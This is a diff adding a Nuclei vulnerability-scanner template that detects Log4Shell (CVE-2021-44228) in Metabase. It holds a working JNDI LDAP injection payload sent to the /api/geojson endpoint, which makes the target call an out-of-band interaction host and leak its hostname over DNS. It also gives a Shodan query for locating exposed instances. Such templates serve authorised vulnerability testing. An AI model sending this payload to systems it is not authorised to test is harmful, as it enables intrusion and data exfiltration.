@@ -1,0 +1,64 @@
+id: metabase-log4j
+
+info:
+  name: Metabase - Remote Code Execution (Apache Log4j)
+  author: DhiyaneshDK
+  severity: critical
+  description: Metabase is susceptible to remote code execution due to an incomplete patch in Apache Log4j 2.15.0 in certain non-default configurations. A remote attacker can pass malicious data and perform a denial of service attack, exfiltrate data, or execute arbitrary code.
+  reference:
+    - https://www.cybersecurity-help.cz/vdb/SB2021121706
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"Metabase"
+  tags: cve,cve2021,rce,jndi,log4j,metabase,kev,oast
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/geojson?url=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.url.{{interactsh-url}}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Invalid GeoJSON file location:'
+
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+# digest: 4b0a00483046022100e1dae2d9a3bd70f30e1bc96ad157fe63786367d971bca3ef9e7a2dfceb148e34022100dfbcbb380dbc7c50c5ee8b15950c2befd49e3ad887b52ff5d96f20ba2179ab93:922c64590222798bb761d5b6d8e72950
